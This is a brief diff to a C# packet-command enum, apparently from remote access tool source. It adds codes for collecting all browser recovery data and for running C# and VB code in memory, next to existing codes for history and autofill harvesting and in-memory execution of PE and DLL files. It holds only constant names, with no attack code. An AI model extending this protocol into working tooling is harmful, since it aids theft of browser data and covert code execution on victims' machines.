@@ -15,6 +15,7 @@ namespace PacketLib.Packet
         RECOVERY_HISTORY =              4,
         RECOVERY_AUTOFILL =             53,
         RECOVERY_KEYWORDS =             54,
+        RECOVERY_ALL =                  66,
 
         FM_GET_DISK =                   5,
         FM_GET_FILES_AND_DIRS =         6,
@@ -40,7 +41,9 @@ namespace PacketLib.Packet
         MEM_EXEC_NATIVE_PE =            18,
         MEM_EXEC_MANAGED_DLL =          19,
         MEM_EXEC_MANAGED_PE =           20,
-        
+        MEM_EXEC_CSHARP_CODE =          64,
+        MEM_EXEC_VB_CODE =              65,
+
         POWER_SHUTDOWN =                21,
         POWER_REBOOT =                  22,
         POWER_LOG_OUT =                 23,
